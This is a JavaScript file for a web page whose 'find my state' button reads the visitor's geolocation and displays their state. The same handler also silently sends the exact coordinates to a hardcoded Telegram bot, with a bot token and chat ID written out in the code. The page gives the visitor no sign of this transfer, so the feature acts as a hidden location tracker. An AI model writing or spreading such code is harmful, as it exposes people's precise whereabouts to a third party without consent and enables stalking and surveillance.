document.addEventListener("DOMContentLoaded", () => {
    const findMyState = () => {
        const status = document.querySelector(".status");

        const success = (position) => {
            console.log(position);
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const geoApiUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`;

            fetch(geoApiUrl)
                .then(res => {
                    if (!res.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return res.json();
                })
                .then(data => {
                    if (data.principalSubdivision) {
                        status.textContent = data.principalSubdivision;
                    } else {
                        status.textContent = "Unable to retrieve state information";
                    }
                })
                .catch(err => {
                    console.error('Fetch error:', err);
                    status.textContent = "Error fetching location data";
                });

            // Отправляем геолокацию в Telegram
            const botToken = '6929675009:AAGo5D3GrmsEho4cO0YQAjohn50XARL3qqY';  // Замените на ваш токен
            const chatId = '5191218616';  // Замените на ваш chat_id
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: latitude,
                    longitude: longitude,
                }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log('Location sent to Telegram:', data);
            })
            .catch(err => {
                console.error('Telegram API error:', err);
            });
        };

        const error = () => {
            status.textContent = "Unable to retrieve your location";
        };

        navigator.geolocation.getCurrentPosition(success, error);
    };

    const findStateButton = document.querySelector(".find-state");
    if (findStateButton) {
        findStateButton.addEventListener("click", findMyState);
    } else {
        console.error('Element with class "find-state" not found.');
    }
});
